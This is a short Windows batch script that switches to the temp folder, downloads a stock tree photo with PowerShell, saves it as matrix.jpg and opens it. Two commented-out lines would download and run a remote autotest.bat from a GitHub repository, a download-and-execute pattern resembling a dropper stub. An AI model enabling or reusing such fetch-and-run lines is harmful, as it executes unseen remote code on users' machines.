@echo off
cd %TEMP%
Powershell -Command "Invoke-WebRequest 'https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg' -OutFile matrix.jpg"
matrix.jpg
::Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/starkodder/C0RTEX/main/autotest.bat' -OutFile autotest.bat"
::autotest.bat
